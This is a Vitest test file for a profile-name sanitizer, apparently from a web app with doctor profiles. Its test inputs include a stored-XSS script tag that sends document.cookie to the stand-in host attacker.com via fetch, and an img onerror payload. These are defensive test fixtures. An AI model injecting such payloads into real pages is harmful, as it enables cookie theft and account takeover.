import { describe, expect, it } from "vitest";
import { sanitizeProfileName, sanitizeProfileNameOrFallback } from "./sanitize";

describe("profile name sanitization", () => {
  it("removes stored XSS script payloads from profile names", () => {
    expect(
      sanitizeProfileName(
        "<script>fetch('https://attacker.com?c='+document.cookie)</script>"
      )
    ).toBe("fetch('https://attacker.com?c='+document.cookie)");
  });

  it("removes HTML tag delimiters and dangerous event-handler markup", () => {
    expect(
      sanitizeProfileName("Dr <img src=x onerror=alert(document.domain)> Rossi")
    ).toBe("Dr Rossi");
  });

  it("normalizes whitespace and falls back when sanitization leaves an empty value", () => {
    expect(
      sanitizeProfileNameOrFallback("<img src=x>", "doctor@example.com")
    ).toBe("doctor@example.com");
  });
});
